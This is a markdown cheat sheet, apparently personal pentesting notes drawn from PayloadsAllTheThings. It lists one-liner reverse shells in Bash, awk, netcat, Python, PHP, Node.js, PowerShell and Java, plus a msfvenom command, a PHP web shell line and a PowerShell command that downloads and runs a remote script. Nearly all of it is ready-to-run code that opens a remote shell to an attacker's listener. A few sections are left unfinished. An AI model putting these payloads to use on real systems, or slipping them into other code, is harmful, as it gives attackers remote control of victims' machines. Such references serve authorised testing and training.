# One-liner Reverse Shell

## Necessary Steps After reverse shell

* We need to get tty shell first.
  * `python -c 'import pty; pty.spawn("/bin/bash");'`
  * d

## How to solve the problem of multiple quotes in a single command while designing a payload?

* 
## UDP Reverse shells

#### Bash UDP

```text
Victim:
sh -i >& /dev/udp/127.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```

## Bash/Linux

* shell script : `/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'`
* Awk : `awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
* Ncat :
  *  `ncat 127.0.0.1 4444 -e /bin/bash` 
  * `ncat --udp 127.0.0.1 4444 -e /bin/bash`
* Python : 
  * `/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
  * `/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("",));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
* Netcat :
  * `nc -e /bin/bash 10.0.0.1 1234`
  * `nc -c /bin/sh 10.0.0.1 1234`
  * `Reverse shell command without quotes` 
    * `msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.137.141 LPORT=8888 R`

![](../../.gitbook/assets/image%20%2894%29.png)

## PHP

### Check if PHP script could be execute

* `<?php $text = phpversion(); alert($text); ?>`
* `<?php echo '<script> alert("Simple alert message"); </script>' ?>`
* `<?php system($_GET["cmd"]); ?>`

### Reverse shell

* `<?php echo shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1'");?>`
* `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");`

## Javascript

```text
var spawn = require('child_process').spawn;
var net = require('net');
var reconnect = require('reconnect');

reconnect(function (stream) {
    var ps = spawn('bash', [ '-i' ]);
    stream.pipe(ps.stdin);
    ps.stdout.pipe(stream, { end: false });
    ps.stderr.pipe(stream, { end: false });
    ps.on('exit', function () { stream.end() });
}).connect(5500, '192.168.60.124');
```

## Powershell

```text
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

```text
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```text
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Java

```text
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Windows Reverse shell using powershell

```text
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

![](../../.gitbook/assets/image%20%2817%29.png)

Ref : [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

Cyber security -&gt; Security bits -&gt; Reverse shells

